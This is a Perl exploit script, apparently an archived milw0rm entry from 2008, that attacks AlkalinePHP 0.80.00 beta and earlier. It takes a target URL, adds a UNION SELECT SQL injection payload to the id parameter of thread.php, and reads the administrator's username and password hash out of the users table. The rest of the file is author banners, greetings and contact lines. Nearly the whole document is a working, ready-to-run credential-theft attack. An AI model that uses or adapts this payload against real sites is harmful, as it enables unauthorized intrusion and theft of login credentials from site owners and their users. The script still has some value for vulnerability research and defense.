#!/usr/bin/perl -w
# Portal   :  AlkalinePHP <= Ver 0.80.00 beta
# Script Download: https://sourceforge.net/projects/alkalinephp/
#  exploit aported password crypted maybe is crypted with mysql
#  exploit tatjibe password mcrypté :d
#  mgharba :d:d:d:d
########################################
#[*] Founded &  Exploited by : Stack-Terrorist [v40]
#[*] Contact: Ev!L =>> see down
#[*] Greetz : Houssamix & Djekmani & Jadi & iuoisn & All muslims HaCkeRs  :)
########################################
#----------------------------------------------------------------------------#
########################################
# * TITLE:          PerlSploit Class
# * REQUIREMENTS:   PHP 4 / PHP 5
# * VERSION:        v.1
# * LICENSE:        GNU General Public License
# * ORIGINAL URL:   http://www.v4-Team/v4.txt
# * FILENAME:       PerlSploitClass.pl
# *
# * CONTACT:        dj-moad@hotmail.fr (french / english / arabic / moroco Darija :d )
# * THNX : AllaH
# * GREETZ:         Houssamix & Djekmani
########################################
#----------------------------------------------------------------------------#
########################################
system("color 02");
print "\t\t############################################################\n\n";
print "\t\t# AlkalinePHP <= Ver 0.80.00 beta - Remote SQL Inj Exploit #\n\n";
print "\t\t#                 by Stack-Terrorist [v40]                 #\n\n";
print "\t\t############################################################\n\n";
########################################
#----------------------------------------------------------------------------#
########################################
use LWP::UserAgent;
die "Example: perl $0 http://victim.com/path/\n" unless @ARGV;
system("color f");
########################################
#----------------------------------------------------------------------------#
########################################
#the username of  AlkalinePHP
$user="user_name";
#the pasword of  AlkalinePHP
$pass="password";
#the tables of AlkalinePHP
$tab="users";
########################################
#----------------------------------------------------------------------------#
########################################
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
########################################
#----------------------------------------------------------------------------#
########################################
$host = $ARGV[0] . "/thread.php?id=-1+union+select+1,2,concat(CHAR(60,117,115,101,114,62),".$user.",CHAR(60,117,115,101,114,62),CHAR(60,112,97,115,115,62),".$pass.",CHAR(60,112,97,115,115,62)),4,5,6,7,8,9,0,1,2,3+from+".$tab."/*";

$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;
########################################
#----------------------------------------------------------------------------#
########################################
if ($answer =~ /<user>(.*?)<user>/){
        print "\nBrought to you by v4-team.com...\n";
        print "\n[+] Admin User : $1";
}
########################################
#----------------------------------------------------------------------------#
########################################
if ($answer =~/<pass>(.*?)<pass>/){print "\n[+] Admin Hash : $1\n\n";
print "\t\t#   Exploit has ben aported user and password hash   #\n\n";}

else{print "\n[-] Exploit Failed...\n";}
########################################
#-------------------Exploit exploited by Stack-Terrorist --------------------#
########################################

# milw0rm.com [2008-05-19]